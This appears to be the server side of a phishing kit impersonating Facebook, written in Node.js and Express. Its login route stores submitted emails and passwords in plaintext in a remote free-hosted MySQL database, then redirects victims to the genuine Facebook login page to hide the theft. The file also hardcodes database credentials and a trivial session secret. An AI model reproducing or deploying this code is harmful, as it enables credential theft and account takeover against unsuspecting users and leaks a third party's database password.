const mysql = require('mysql');
const express = require('express');
const path = require('path');
const session = require('express-session');

const app = express();

const db = mysql.createConnection({

	host: 'sql11.freemysqlhosting.net',
	user: 'sql11678361',
	password: 'YEPB8DJCPe',
	database: 'sql11678361'
});

db.connect((error) => {

	if (error) {

		console.log(error);

	} else {

		console.log("MySQL Connected...");
	}
});

app.use(session({
	secret: 'secret',
	resave: true,
	saveUninitialized: true
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(path.join(__dirname, 'css')));


// http://localhost:5000/
app.get('/', function (request, response) {
	// Render login 
	response.sendFile(path.join(__dirname + '/public/login.html'));
});

app.set('port', 10000)

app.listen(app.get('port'), () => {
	console.log('localhost:5000')
});

// Route to handle form submission
app.post('/login', (req, res) => {
	const { email, password } = req.body;

	// Insert data into MySQL
	const query = 'INSERT INTO users (email, password) VALUES (?, ?)';
	db.query(query, [email, password], (err, result) => {
		if (err) {
			console.error('MySQL query error:', err);
			res.send('Error registering user.');
		} else {
			console.log('User registered successfully');

			res.redirect('https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzA1NzU3NTU4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D');
		}
	});
});

